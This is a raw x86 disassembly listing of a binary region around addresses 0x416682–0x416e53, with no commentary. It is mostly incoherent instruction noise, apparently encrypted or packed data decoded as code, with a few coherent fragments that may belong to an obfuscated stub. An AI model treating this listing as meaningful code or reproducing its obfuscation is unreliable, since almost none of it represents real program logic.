  416682:	push   0xf29aea86
  416687:	les    edx,FWORD PTR [ebx+0x1a]
  41668a:	add    bl,dl
  41668c:	and    BYTE PTR [ecx],cl
  41668e:	mov    al,0x64
  416690:	int3   
  416691:	stos   DWORD PTR es:[edi],eax
  416692:	rcr    bl,0x62
  416695:	into   
  416696:	into   
  416697:	repnz xor DWORD PTR [esp+eax*2],edx
  41669b:	fldenv [ebp-0x3ca4e882]
  4166a1:	fcomp  QWORD PTR [edx+0x20]
  4166a4:	fs push ss
  4166a6:	xor    BYTE PTR [esi-0x48],cl
  4166a9:	pop    es
  4166aa:	test   BYTE PTR [ecx+0x53f72e3f],al
  4166b0:	add    BYTE PTR [ecx-0x1d],bl
  4166b3:	mov    edi,0xcb2839c0
  4166b8:	sub    esi,edi
  4166ba:	mov    cs,eax
  4166bc:	lahf   
  4166bd:	jecxz  0x41667d
  4166bf:	aam    0x37
  4166c1:	xchg   DWORD PTR [edx-0xc],ecx
  4166c4:	out    dx,eax
  4166c5:	int    0xe9
  4166c7:	xchg   ebx,eax
  4166c8:	xchg   BYTE PTR [ecx+0x2d387004],cl
  4166ce:	and    BYTE PTR [eax-0x3d25ab7b],ah
  4166d4:	leave  
  4166d5:	or     dl,bl
  4166d7:	cdq    
  4166d8:	test   ch,bl
  4166da:	mov    edi,DWORD PTR [edi]
  4166dc:	scas   al,BYTE PTR es:[edi]
  4166dd:	shl    DWORD PTR [ecx+0x553d217],0xe5
  4166e4:	imul   esp,DWORD PTR [edx],0x7b
  4166e7:	loope  0x4166c0
  4166e9:	lock test edx,ecx
  4166ec:	outs   dx,BYTE PTR ds:[esi]
  4166ed:	mov    cl,0x47
  4166ef:	push   0xfffffffd
  4166f1:	adc    BYTE PTR [ecx+ecx*4],ch
  4166f4:	add    ah,ch
  4166f6:	dec    ebx
  4166f7:	ja     0x41674c
  4166f9:	popf   
  4166fa:	dec    ebx
  4166fb:	xchg   ecx,eax
  4166fc:	in     al,dx
  4166fd:	(bad)  
  4166fe:	pop    edi
  4166ff:	addr16 mov cl,0x96
  416702:	aam    0xe
  416704:	pusha  
  416705:	(bad)  
  416706:	xchg   ebx,eax
  416707:	scas   al,BYTE PTR es:[edi]
  416708:	test   ah,dl
  41670a:	mov    esi,0x3c6a7c2f
  41670f:	int3   
  416710:	outs   dx,DWORD PTR ds:[esi]
  416711:	mov    ebp,esp
  416713:	fld    DWORD PTR [edi-0x19]
  416716:	or     BYTE PTR [ebp-0x19],ch
  416719:	sbb    ch,BYTE PTR [ecx+eiz*2]
  41671c:	in     al,dx
  41671d:	fwait
  41671e:	outs   dx,DWORD PTR ds:[esi]
  41671f:	retf   
  416720:	pop    edx
  416721:	in     al,0xf3
  416723:	ds retf 0x51ee
  416727:	fld    QWORD PTR [eax]
  416729:	and    BYTE PTR [esi+0x78],bh
  41672c:	bound  ecx,QWORD PTR [edi]
  41672e:	push   edi
  41672f:	xchg   esi,eax
  416730:	out    0x5e,al
  416732:	cmp    BYTE PTR [edi-0x4c],bl
  416735:	call   0xe7bb59d8
  41673a:	bound  edi,QWORD PTR [ebx+0x30a98d49]
  416740:	inc    edi
  416741:	mov    edi,0x6b4a6254
  416746:	in     al,0xb5
  416748:	inc    ecx
  416749:	adc    al,0x38
  41674b:	or     BYTE PTR [edx],dh
  41674d:	inc    esp
  41674e:	(bad)  
  41674f:	out    dx,al
  416750:	xchg   BYTE PTR [ebx+eiz*2-0x5a62e5a2],al
  416757:	arpl   WORD PTR [edi-0x2b],bp
  41675a:	cmp    DWORD PTR [ecx+0x18],edx
  41675d:	mov    ds:0x5bf9ba80,eax
  416762:	sti    
  416763:	dec    ebx
  416764:	adc    ecx,DWORD PTR [ebp-0x70]
  416767:	retf   0x73e2
  41676a:	dec    esi
  41676b:	add    DWORD PTR [ebx-0x43a1d3c1],eax
  416771:	add    DWORD PTR [ebx],esi
  416773:	add    BYTE PTR [ebx-0x25],al
  416776:	out    0xa4,al
  416778:	es pop ebx
  41677a:	nop
  41677b:	(bad)  
  41677c:	in     eax,dx
  41677d:	fld    DWORD PTR [ecx]
  41677f:	out    0x11,al
  416781:	ficomp DWORD PTR [esi+0x7b62f47f]
  416787:	lods   al,BYTE PTR ds:[esi]
  416788:	fs cdq 
  41678a:	push   ebx
  41678b:	jae    0x4167af
  41678d:	out    dx,al
  41678e:	push   cs
  41678f:	push   edx
  416790:	sub    ah,BYTE PTR [ebp+0x3b]
  416793:	mov    eax,ds:0xfd2bb360
  416798:	or     eax,0xeb0567b5
  41679d:	cli    
  41679e:	dec    eax
  41679f:	int3   
  4167a0:	add    cl,bl
  4167a2:	mov    al,ds:0xaec251a2
  4167a7:	dec    ecx
  4167a8:	push   ds
  4167a9:	xchg   esi,eax
  4167aa:	jne    0x4167ae
  4167ac:	push   cs
  4167ad:	pop    edi
  4167ae:	in     eax,dx
  4167af:	dec    esi
  4167b0:	add    DWORD PTR [ecx-0x439173b3],ebx
  4167b6:	mov    dh,BYTE PTR [eax-0x1a]
  4167b9:	push   ss
  4167ba:	xlat   BYTE PTR ds:[ebx]
  4167bb:	jmp    0x4167b8
  4167bd:	retf   
  4167be:	pusha  
  4167bf:	cvttps2pi mm1,xmm7
  4167c2:	push   esp
  4167c3:	imul   esi,DWORD PTR [ecx-0x3a72b7d1],0xb3080ac
  4167cd:	xor    eax,0x38a15282
  4167d2:	in     al,dx
  4167d3:	jae    0x416833
  4167d5:	dec    eax
  4167d6:	test   eax,0xb1358854
  4167db:	out    0x89,al
  4167dd:	add    cl,BYTE PTR [ebp+0x73]
  4167e0:	mov    DWORD PTR [edx],edi
  4167e2:	cmp    ch,dh
  4167e4:	or     al,0x83
  4167e6:	jle    0x41682b
  4167e8:	and    DWORD PTR [esi-0x12],ebp
  4167eb:	jns    0x41678a
  4167ed:	stos   BYTE PTR es:[edi],al
  4167ee:	out    0x1,eax
  4167f0:	out    0xa8,eax
  4167f2:	add    eax,0xa79e8dc1
  4167f7:	dec    esp
  4167f8:	enter  0x64fe,0xdc
  4167fc:	pop    ss
  4167fd:	mov    eax,0x39a0836a
  416802:	imul   ebp,eax,0xfffffff7
  416805:	(bad)
  416808:	cwde   
  416809:	cwde   
  41680a:	mov    ebx,DWORD PTR [esi-0x3627df60]
  416810:	fist   DWORD PTR [eax+0x190b3f8d]
  416816:	xchg   ebp,eax
  416817:	je     0x416814
  416819:	std    
  41681a:	in     al,dx
  41681b:	adc    eax,0x5f9e1060
  416820:	fld    TBYTE PTR [eax]
  416822:	mov    edi,0x92083477
  416827:	(bad)  
  416829:	fnstcw WORD PTR [edx]
  41682b:	lahf   
  41682c:	and    ebp,DWORD PTR [edi+edx*4+0x448f5112]
  416833:	or     DWORD PTR [ecx],0x3ba63542
  416839:	bound  ecx,QWORD PTR [eax+0x34]
  41683c:	addr16 iret 
  41683e:	pop    es
  41683f:	test   DWORD PTR [eax-0x64],esi
  416842:	xor    eax,0x5e4319e6
  416847:	idiv   BYTE PTR [esi+0x3308558b]
  41684d:	leave  
  41684e:	add    ecx,DWORD PTR ds:0x42a321
  416854:	mov    edi,DWORD PTR ds:0x42a429
  41685a:	sub    edi,ecx
  41685c:	sub    ecx,DWORD PTR [ecx+edi*1]
  41685f:	jmp    0x416d71
  416864:	(bad)  
  416865:	xlat   BYTE PTR ds:[ebx]
  416866:	cmp    al,0xc6
  416868:	int3   
  416869:	fxch   st(1)
  41686b:	aad    0x41
  41686d:	ins    BYTE PTR es:[edi],dx
  41686e:	test   eax,0x91ba22c7
  416873:	and    eax,0x787fc6eb
  416878:	jae    0x4168f6
  41687a:	js     0x4168f4
  41687c:	or     BYTE PTR [esi],al
  41687e:	cmp    ch,BYTE PTR [eax]
  416880:	ins    BYTE PTR es:[edi],dx
  416881:	mov    DWORD PTR [eax],edi
  416883:	outs   dx,DWORD PTR ds:[esi]
  416884:	push   ebx
  416885:	sahf   
  416886:	fistp  DWORD PTR [edi]
  416888:	fsub   DWORD PTR [edi+0xc]
  41688b:	(bad)  
  41688c:	push   0x86e06d11
  416891:	cmp    eax,0x13d1f902
  416896:	sbb    eax,0xe800d187
  41689b:	jg     0x416902
  41689d:	out    dx,eax
  41689e:	cmc    
  41689f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168a1:	pushf  
  4168a2:	push   cs
  4168a3:	lods   eax,DWORD PTR ds:[esi]
  4168a4:	sbb    BYTE PTR [ebp-0x6e],bl
  4168a7:	loope  0x41687c
  4168a9:	jp     0x4168ce
  4168ab:	push   ebx
  4168ac:	ror    BYTE PTR [ebx],cl
  4168ae:	sbb    ebx,DWORD PTR [esi]
  4168b0:	inc    edx
  4168b1:	clc    
  4168b2:	dec    edx
  4168b3:	sub    DWORD PTR [ecx-0x71],eax
  4168b6:	xor    al,0x51
  4168b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b9:	sbb    BYTE PTR [esi],bl
  4168bb:	push   ebp
  4168bc:	lds    ecx,FWORD PTR [ebx]
  4168be:	test   BYTE PTR [edx+0x24],0x54
  4168c2:	or     eax,0x8e249708
  4168c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168c8:	and    BYTE PTR ds:0xb2e8ff54,0x20
  4168cf:	sub    DWORD PTR [edx+0x5f0804d0],0x86d373c2
  4168d9:	out    dx,eax
  4168da:	push   cs
  4168db:	push   es
  4168dc:	fisub  WORD PTR [eax+0x16]
  4168df:	and    eax,0x9c0e45e0
  4168e4:	jecxz  0x416886
  4168e6:	out    0x62,eax
  4168e8:	mov    bh,BYTE PTR [eax+0x1b]
  4168eb:	mov    cl,0x8f
  4168ed:	dec    edi
  4168ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168ef:	xchg   edx,eax
  4168f0:	clc    
  4168f1:	sti    
  4168f2:	sub    eax,0x122aa93
  4168f7:	je     0x416961
  4168f9:	stos   DWORD PTR es:[edi],eax
  4168fa:	inc    ebp
  4168fb:	rol    ebp,1
  4168fd:	xchg   ebx,eax
  4168fe:	test   al,ch
  416900:	mov    ds:0xe8a50227,al
  416905:	shl    BYTE PTR [edx-0x5325768],0x1d
  41690c:	pop    esp
  41690d:	bnd js 0x41690f
  416910:	and    edi,DWORD PTR [ebx+eax*2-0x1]
  416914:	mov    ds:0xbe3ba05,al
  416919:	jne    0x41699a
  41691b:	or     eax,0x2a10fd74
  416920:	fistp  DWORD PTR [ebx]
  416922:	fisttp QWORD PTR [edx-0x51766a0a]
  416928:	cdq    
  416929:	jecxz  0x41698c
  41692b:	sti    
  41692c:	mov    eax,0x106f35c3
  416931:	inc    edi
  416932:	jo     0x416921
  416934:	ret    0x7189
  416937:	xlat   BYTE PTR ds:[ebx]
  416938:	std    
  416939:	aas    
  41693a:	sar    DWORD PTR [eax-0x56d6baf0],1
  416940:	je     0x41693c
  416942:	or     ebx,DWORD PTR [edi-0x3f]
  416945:	icebp  
  416946:	jmp    DWORD PTR [ebx]
  416948:	pop    ds
  416949:	call   0xca49:0x53e3d3b0
  416950:	psraw  mm6,QWORD PTR [ebx-0x10]
  416954:	jmp    0xaf870993
  416959:	sti    
  41695a:	ins    DWORD PTR es:[edi],dx
  41695b:	or     esp,DWORD PTR [ebx]
  41695d:	mov    al,0x8c
  41695f:	or     BYTE PTR [ecx+0x15],cl
  416962:	pushf  
  416963:	unpcklps xmm3,xmm3
  416966:	mov    WORD PTR [edx-0x5a],fs
  416969:	sbb    eax,0xd9e133f9
  41696e:	xor    al,0x60
  416970:	arpl   WORD PTR [ecx],ax
  416972:	adc    DWORD PTR [eax],0x63
  416975:	shl    BYTE PTR [edi],0x9b
  416978:	sbb    BYTE PTR es:[edx],cl
  41697b:	ds mov dl,0x75
  41697e:	test   al,0x78
  416980:	ins    DWORD PTR es:[edi],dx
  416981:	mov    esp,0x252a4c90
  416986:	popa   
  416987:	push   ecx
  416988:	std    
  416989:	pop    es
  41698a:	sbb    esp,DWORD PTR [ebp+0x4138f56a]
  416990:	imul   edi,DWORD PTR [edx-0x45fec89e],0x6b0ba064
  41699a:	pop    ebp
  41699b:	push   eax
  41699c:	fadd   DWORD PTR [edx-0x7f849b58]
  4169a2:	ficom  DWORD PTR [ecx-0x26]
  4169a5:	add    ebp,esi
  4169a7:	mov    bl,0xb4
  4169a9:	xchg   edx,eax
  4169aa:	push   ds
  4169ab:	cmp    BYTE PTR [ebp-0x5f],dh
  4169ae:	test   al,0x9e
  4169b0:	xchg   esi,eax
  4169b1:	pop    esp
  4169b2:	(bad)  
  4169b3:	lods   eax,DWORD PTR ds:[esi]
  4169b4:	inc    ecx
  4169b5:	(bad)  
  4169b7:	sbb    al,ah
  4169b9:	clc    
  4169ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169bb:	adc    al,0xb7
  4169bd:	imul   edx,DWORD PTR [esi+0x123ef6d1],0x26631364
  4169c7:	pop    ss
  4169c8:	push   ebp
  4169c9:	mov    eax,esi
  4169cb:	cmp    BYTE PTR [ebp+edi*1-0x6347e0bc],ah
  4169d2:	outs   dx,BYTE PTR ds:[esi]
  4169d3:	xor    al,0x2d
  4169d5:	ins    DWORD PTR es:[edi],dx
  4169d6:	mov    dl,0x94
  4169d8:	dec    ecx
  4169d9:	mov    esi,0x911bcc5d
  4169de:	jl     0x416a3b
  4169e0:	adc    eax,DWORD PTR [edi+0x2532b1f2]
  4169e6:	dec    esi
  4169e7:	rcl    BYTE PTR [edx+0x2c273bb1],0xb3
  4169ee:	push   ss
  4169ef:	pop    esp
  4169f0:	jo     0x416a60
  4169f2:	fstp   QWORD PTR [edx-0x6a]
  4169f5:	xchg   BYTE PTR [edx+0xe404d14],dh
  4169fb:	js     0x4169a8
  4169fd:	out    dx,eax
  4169fe:	cmp    al,0x8b
  416a00:	das    
  416a01:	inc    eax
  416a02:	repz data16 sti 
  416a05:	adc    ah,dl
  416a07:	jmp    0x416a63
  416a09:	cmp    cl,BYTE PTR [edi+0x3c115547]
  416a0f:	or     ecx,DWORD PTR [eax-0x57e61c7c]
  416a15:	aaa    
  416a16:	imul   ebx,esi,0xb5a73643
  416a1c:	scas   eax,DWORD PTR es:[edi]
  416a1d:	and    ah,al
  416a1f:	dec    ecx
  416a20:	xchg   esp,eax
  416a21:	xor    dh,0xde
  416a24:	adc    edx,DWORD PTR [edi-0xd]
  416a27:	fimul  WORD PTR [ecx+ebp*1]
  416a2a:	fld    DWORD PTR [ebp+esi*1+0x45cd4efa]
  416a31:	enter  0x3cd7,0xa7
  416a35:	outs   dx,BYTE PTR cs:[esi]
  416a37:	dec    esp
  416a38:	jbe    0x416a82
  416a3a:	push   edx
  416a3b:	aam    0x75
  416a3d:	int3   
  416a3e:	mov    ah,ch
  416a40:	xor    dl,BYTE PTR [eax+0x1d]
  416a43:	adc    bl,BYTE PTR [eax-0x76]
  416a46:	fwait
  416a47:	sbb    ebp,esp
  416a49:	dec    esi
  416a4a:	push   esp
  416a4b:	xor    BYTE PTR [ebx-0x2a16a4e8],al
  416a51:	adc    DWORD PTR [ebp+ebx*8+0x22],eax
  416a55:	stos   DWORD PTR es:[edi],eax
  416a56:	pop    esp
  416a57:	outs   dx,BYTE PTR ds:[esi]
  416a58:	mov    cl,0x38
  416a5a:	mov    ds:0x5b068695,eax
  416a5f:	mov    cl,0x2a
  416a61:	add    eax,0xfb3e1e01
  416a66:	fdivr  DWORD PTR [ebx+0x22]
  416a69:	(bad)  
  416a6a:	aad    0x16
  416a6c:	outs   dx,DWORD PTR ds:[esi]
  416a6d:	or     esi,DWORD PTR [ebx]
  416a6f:	aaa    
  416a70:	and    edx,ebx
  416a72:	push   cs
  416a73:	jmp    0xe52e2384
  416a78:	xchg   ebp,eax
  416a79:	dec    esp
  416a7a:	dec    edi
  416a7b:	cmp    ecx,ecx
  416a7d:	js     0x416aaf
  416a7f:	ds jl  0x416a44
  416a82:	jmp    0x416ad3
  416a84:	adc    BYTE PTR [eax+edi*4],cl
  416a87:	enter  0x10fa,0xe
  416a8b:	pusha  
  416a8c:	mov    edi,0xf7b384b5
  416a91:	je     0x416a73
  416a93:	mov    ebp,0x2d4b859b
  416a98:	shr    BYTE PTR [ebx+0x1b],cl
  416a9b:	test   BYTE PTR [ecx+0x3587f8b8],ah
  416aa1:	das    
  416aa2:	push   es
  416aa3:	in     al,0xe0
  416aa5:	sub    ch,dl
  416aa7:	iret   
  416aa8:	and    DWORD PTR [esi],edi
  416aaa:	fstp   TBYTE PTR ds:0xd2eb987c
  416ab0:	mov    ebx,0x1285b351
  416ab5:	arpl   WORD PTR [ecx+esi*4],sp
  416ab8:	xchg   esi,eax
  416ab9:	cmp    eax,0x6a7eecf0
  416abe:	sub    eax,0x60370a85
  416ac3:	(bad)  
  416ac4:	into   
  416ac5:	outs   dx,DWORD PTR ds:[esi]
  416ac6:	hlt    
  416ac7:	push   0xb
  416ac9:	sbb    BYTE PTR [ebp+edi*2+0x3e50a1ee],bh
  416ad0:	aas    
  416ad1:	adc    ch,al
  416ad3:	mov    dh,BYTE PTR [ebx]
  416ad5:	fisttp QWORD PTR [esi+0x30e6d1a6]
  416adb:	aas    
  416adc:	inc    ebx
  416add:	xor    al,BYTE PTR [ecx]
  416adf:	cmp    al,0x94
  416ae1:	or     eax,0xbb6f3a87
  416ae6:	in     eax,0xc
  416ae8:	mov    al,ds:0xabe7b6a7
  416aed:	mov    dl,0x78
  416aef:	push   ebp
  416af0:	dec    edi
  416af1:	int3   
  416af2:	jmp    0x2175:0x808225be
  416af9:	in     eax,dx
  416afa:	ins    DWORD PTR es:[edi],dx
  416afb:	aaa    
  416afc:	or     eax,0x55e102ff
  416b01:	mov    ebx,DWORD PTR [ecx-0x3d3dd2b]
  416b07:	mov    cl,0xa8
  416b09:	xchg   ecx,eax
  416b0a:	in     eax,dx
  416b0b:	mov    ah,0xd1
  416b0d:	jne    0x416aef
  416b0f:	sahf   
  416b10:	push   0xa3d72541
  416b15:	xor    DWORD PTR [ebx],edi
  416b17:	xor    eax,0x50acd31
  416b1c:	inc    ecx
  416b1d:	jmp    0x416ab8
  416b1f:	add    al,al
  416b21:	icebp  
  416b22:	aam    0xb2
  416b24:	mov    esi,0x3c76cb2d
  416b29:	push   ds
  416b2a:	push   es
  416b2b:	das    
  416b2c:	jo     0x416b4a
  416b2e:	pusha  
  416b2f:	mov    ecx,0xd27e0cfd
  416b34:	sub    esi,ecx
  416b36:	xchg   DWORD PTR [ebp+0x5f4a620d],eax
  416b3c:	cmp    DWORD PTR [eax],edx
  416b3e:	push   edi
  416b3f:	addr16 je 0x416b39
  416b42:	nop
  416b43:	pop    edi
  416b44:	push   ecx
  416b45:	or     edi,DWORD PTR [eax+esi*1+0x64d7a49d]
  416b4c:	xchg   esi,eax
  416b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b4e:	sbb    BYTE PTR [ebx+edi*2],al
  416b51:	(bad)  
  416b52:	jg     0x416b9d
  416b54:	mov    ds:0x7805bfcc,al
  416b59:	fdiv   DWORD PTR fs:[eax-0x798e5f6]
  416b60:	adc    eax,0xa0353414
  416b65:	jb     0x416afd
  416b67:	icebp  
  416b68:	pop    ebx
  416b69:	inc    ebp
  416b6a:	mov    dl,0xb3
  416b6c:	(bad)  
  416b6e:	outs   dx,DWORD PTR ds:[esi]
  416b6f:	adc    DWORD PTR ds:0x93f060a5,ebx
  416b75:	mov    DWORD PTR [eax],0xb5fd130
  416b7b:	int3   
  416b7c:	pop    ebx
  416b7d:	mov    ds:0x263afd28,eax
  416b82:	imul   edi,edi,0xffffffc8
  416b85:	push   0xffffffd4
  416b87:	sbb    eax,0xe3c38691
  416b8c:	in     al,dx
  416b8d:	test   BYTE PTR [ebp-0x24aa3110],dl
  416b93:	push   ebx
  416b94:	repz test eax,0x7fc3a9fd
  416b9a:	cs jle 0x416b3b
  416b9d:	dec    ebx
  416b9e:	inc    ebp
  416b9f:	inc    edi
  416ba0:	ds fs cmc 
  416ba3:	add    ecx,DWORD PTR [edi+0x77e72dc3]
  416ba9:	icebp  
  416baa:	repnz shl edi,cl
  416bad:	pop    ebp
  416bae:	dec    ebx
  416baf:	ins    BYTE PTR es:[edi],dx
  416bb0:	sbb    DWORD PTR [edx],esi
  416bb2:	adc    eax,esi
  416bb4:	std    
  416bb5:	or     DWORD PTR [esp+ecx*2-0x3f9533ea],eax
  416bbc:	ss enter 0x96b2,0x27
  416bc1:	xchg   edi,eax
  416bc2:	retf   0xed45
  416bc5:	ins    BYTE PTR es:[edi],dx
  416bc6:	dec    esi
  416bc7:	pop    es
  416bc8:	add    al,0x69
  416bca:	inc    edi
  416bcb:	in     eax,dx
  416bcc:	or     edi,esp
  416bce:	xor    ebp,ebx
  416bd0:	or     al,0xb6
  416bd2:	pusha  
  416bd3:	sub    eax,0x265eed8d
  416bd8:	dec    esi
  416bd9:	add    DWORD PTR ds:0x50e20165,ebp
  416bdf:	cmp    edi,DWORD PTR [ebx]
  416be1:	aas    
  416be2:	div    BYTE PTR [ecx+0x1e]
  416be5:	idiv   DWORD PTR ds:0xe1651c95
  416beb:	std    
  416bec:	shl    BYTE PTR [eax],0x5e
  416bef:	pop    esp
  416bf0:	jge    0x416b77
  416bf2:	int3   
  416bf3:	data16 xor dh,BYTE PTR [eax-0x5c039de8]
  416bfa:	popa   
  416bfb:	mov    al,ds:0xd96fc6b1
  416c00:	add    al,0x65
  416c02:	ror    BYTE PTR [edi-0x38b677a6],1
  416c08:	into   
  416c09:	sub    DWORD PTR [ebp+esi*2-0x60],ecx
  416c0d:	jne    0x416be8
  416c0f:	inc    edi
  416c10:	jp     0x416bd9
  416c12:	into   
  416c13:	add    al,0xac
  416c15:	push   ecx
  416c16:	mov    al,0x79
  416c18:	int    0x72
  416c1a:	and    bl,BYTE PTR [edx]
  416c1c:	enter  0xcef1,0xcd
  416c20:	stos   DWORD PTR es:[edi],eax
  416c21:	add    DWORD PTR [ebx+0x22],ebp
  416c24:	ret    
  416c25:	mov    esi,0x4cc54971
  416c2a:	mov    ?,eax
  416c2c:	nop
  416c2d:	jo     0x416c63
  416c2f:	mov    esi,0x4ef4ffc8
  416c34:	dec    esp
  416c35:	repnz repnz rcl BYTE PTR [edx+0x2f8c20b2],cl
  416c3d:	sar    BYTE PTR es:0x4556fb08,0x81
  416c45:	imul   ebx,ebp,0x3f39f49d
  416c4b:	mov    al,ds:0xbe1c5caa
  416c50:	aad    0x1b
  416c52:	gs mov dh,0xe
  416c55:	fst    st(4)
  416c57:	shl    eax,0x9
  416c5a:	inc    eax
  416c5b:	cmp    BYTE PTR [ecx-0x376c92ad],0xa0
  416c62:	add    BYTE PTR [eax+0x10ae2723],dh
  416c68:	xchg   ebx,eax
  416c69:	push   eax
  416c6a:	add    ebx,DWORD PTR [edi+ecx*8]
  416c6d:	inc    ch
  416c6f:	sbb    eax,0xfffffff5
  416c72:	jecxz  0x416c0b
  416c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c75:	cwde   
  416c76:	cmp    al,BYTE PTR [ebp-0x30]
  416c79:	daa    
  416c7a:	and    DWORD PTR [esi-0x52],0x29
  416c7e:	or     DWORD PTR [ebx+0x63],ebp
  416c81:	xchg   esp,eax
  416c82:	mov    cl,0x61
  416c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c85:	add    DWORD PTR [edi],eax
  416c87:	les    esp,FWORD PTR [edi-0x23c24cfb]
  416c8d:	jno    0x416cdd
  416c8f:	fs jle 0x416c16
  416c92:	or     esi,DWORD PTR [ebx-0x31]
  416c95:	inc    eax
  416c96:	push   ebp
  416c98:	dec    ebx
  416c99:	sahf   
  416c9a:	hlt    
  416c9b:	arpl   WORD PTR [ebx-0x33],sp
  416c9e:	imul   BYTE PTR [edx]
  416ca0:	sar    bl,1
  416ca2:	sbb    ebp,DWORD PTR [eax+ebp*2+0x2c]
  416ca6:	inc    eax
  416ca7:	ret    
  416ca8:	popa   
  416ca9:	and    BYTE PTR [edx+0x2a],bl
  416cac:	arpl   cx,si
  416cae:	dec    eax
  416caf:	xor    esi,edx
  416cb1:	mov    esp,DWORD PTR [ebx]
  416cb3:	adc    eax,0x69eec9e7
  416cb8:	fimul  WORD PTR [edi]
  416cba:	ret    0x1fa5
  416cbd:	lea    edi,[ebx+0x5c]
  416cc0:	arpl   sp,ax
  416cc2:	sub    DWORD PTR [edx+ebx*1],eax
  416cc5:	scas   eax,DWORD PTR es:[edi]
  416cc6:	arpl   WORD PTR [edi+0x31],ax
  416cc9:	in     eax,dx
  416cca:	add    DWORD PTR ds:0x7d2f53d1,0x4edad725
  416cd4:	pushf  
  416cd5:	inc    ebx
  416cd6:	arpl   WORD PTR [edi+0x3fedbc1c],dx
  416cdc:	mov    dl,0x73
  416cde:	xor    BYTE PTR [eax+0x5952ead1],0x8f
  416ce5:	stos   BYTE PTR es:[edi],al
  416ce6:	hlt    
  416ce7:	mov    ebp,0xa6e88c36
  416cec:	pop    ebx
  416ced:	jg     0x416c9f
  416cef:	sub    al,0xf9
  416cf1:	sbb    bh,ch
  416cf3:	aam    0x1a
  416cf5:	mov    edi,0x2fac4bb
  416cfa:	mov    edi,DWORD PTR [ecx]
  416cfc:	pusha  
  416cfd:	sbb    esi,0x2a35d168
  416d03:	push   0xb27e9146
  416d08:	jmp    0xbcc8:0x6b8ccb7f
  416d0f:	test   eax,0x1c489b03
  416d14:	stos   DWORD PTR es:[edi],eax
  416d15:	or     BYTE PTR [ecx+0x4c2a2c2],bh
  416d1b:	rol    esi,cl
  416d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d1e:	loop   0x416cfd
  416d20:	sbb    ecx,DWORD PTR [edi]
  416d22:	lods   eax,DWORD PTR ds:[esi]
  416d23:	ss jecxz 0x416ccb
  416d26:	ret    
  416d27:	mov    dh,0x14
  416d29:	mov    dh,0x5c
  416d2b:	adc    al,0x24
  416d2d:	xor    DWORD PTR [edx+0x571ae418],esp
  416d33:	cmp    edx,DWORD PTR gs:[esp+esi*8]
  416d37:	jns    0x416d7d
  416d39:	adc    eax,0xf30561e6
  416d3e:	cmp    BYTE PTR gs:[eax],bh
  416d41:	test   DWORD PTR [ebx+0x7ad0a64f],0x27ab8a07
  416d4b:	push   ebp
  416d4c:	dec    esp
  416d4d:	mov    bh,0x27
  416d4f:	adc    eax,0xf2bca01b
  416d54:	(bad)  [ebp+0x74ba2aca]
  416d5a:	push   ds
  416d5b:	sbb    eax,0x6f8f212c
  416d60:	popf   
  416d61:	cmp    al,0x99
  416d63:	pop    ebx
  416d64:	daa    
  416d65:	jb     0x416d4c
  416d67:	out    0xd2,al
  416d69:	sub    eax,0xbba1b20d
  416d6e:	jb     0x416d1a
  416d70:	test   eax,0x8bc04589
  416d75:	cmp    eax,0x42a3e9
  416d7a:	mov    edi,DWORD PTR [edi]
  416d7c:	add    DWORD PTR ds:0x42a3b9,edi
  416d82:	mov    eax,0x7510850
  416d87:	mov    edi,DWORD PTR ds:0x42a309
  416d8d:	mov    edi,DWORD PTR [edi]
  416d8f:	adc    DWORD PTR ds:0x42a2e1,edi
  416d95:	jmp    0x4172a7
  416d9a:	mov    eax,0xc1c9c1c9
  416da0:	(bad)  
  416da1:	retf   0x720e
  416da4:	or     ebx,ebp
  416da6:	out    0xd7,eax
  416da8:	jle    0x416de1
  416daa:	fmulp  st(1),st
  416dac:	jg     0x416e26
  416dae:	jae    0x416e2c
  416db0:	js     0x416e2a
  416db2:	mov    ecx,0x7bdb80e9
  416db7:	jns    0x416e2f
  416db9:	push   es
  416dba:	jmp    0x9d241fe5
  416dbf:	mov    al,ds:0xbee9dda7
  416dc4:	xchg   DWORD PTR [ecx+ebp*4+0x2dfb4f80],eax
  416dcb:	imul   edi,DWORD PTR [esi+0x2eabb80a],0x78
  416dd2:	adc    BYTE PTR [ebx],al
  416dd4:	lods   eax,DWORD PTR ds:[esi]
  416dd5:	bound  esi,QWORD PTR ds:0x66ad10a4
  416ddb:	ror    DWORD PTR [ebp-0x57],cl
  416dde:	jnp    0x416e06
  416de0:	lock daa 
  416de2:	mov    es,WORD PTR [ebx+0x78]
  416de5:	and    al,0xd4
  416de7:	idiv   DWORD PTR [ecx]
  416de9:	dec    esp
  416dea:	addr16 cli 
  416dec:	inc    edi
  416ded:	(bad)  
  416dee:	jmp    0xbd96:0x2e44a61c
  416df5:	cli    
  416df6:	call   0x1b1df1cf
  416dfb:	jle    0x416e39
  416dfd:	pushf  
  416dfe:	pop    eax
  416dff:	xchg   esp,eax
  416e00:	sbb    eax,0x20e1a9a4
  416e05:	ss sbb dl,al
  416e08:	sbb    eax,0xbf638ee3
  416e0d:	mov    al,ds:0x6dd68132
  416e12:	aaa    
  416e13:	aam    0x94
  416e15:	xchg   ebx,eax
  416e16:	jno    0x416e8a
  416e18:	mov    ah,0x24
  416e1a:	and    al,0x3f
  416e1c:	cmp    BYTE PTR [eax+0x39],0x56
  416e20:	push   ss
  416e21:	cdq    
  416e22:	fsubr  QWORD PTR [ecx+0x1affe960]
  416e28:	in     eax,0x1c
  416e2a:	sbb    BYTE PTR [ecx+ecx*8+0x50],cl
  416e2e:	mov    eax,0xf52a00c0
  416e33:	lock imul ebx,ecx,0xea1521e1
  416e3a:	or     edi,DWORD PTR [ebx]
  416e3c:	mov    ebp,0xec70c933
  416e41:	outs   dx,DWORD PTR ds:[esi]
  416e42:	std    
  416e43:	hlt    
  416e44:	das    
  416e45:	pop    esp
  416e46:	xchg   edi,eax
  416e47:	(bad)  [eax+edi*4-0x47dd95b6]
  416e4e:	sub    esi,DWORD PTR [esi]
  416e50:	out    dx,eax
  416e51:	mov    dl,0x5e
  416e53:	push   0xf8348ad3
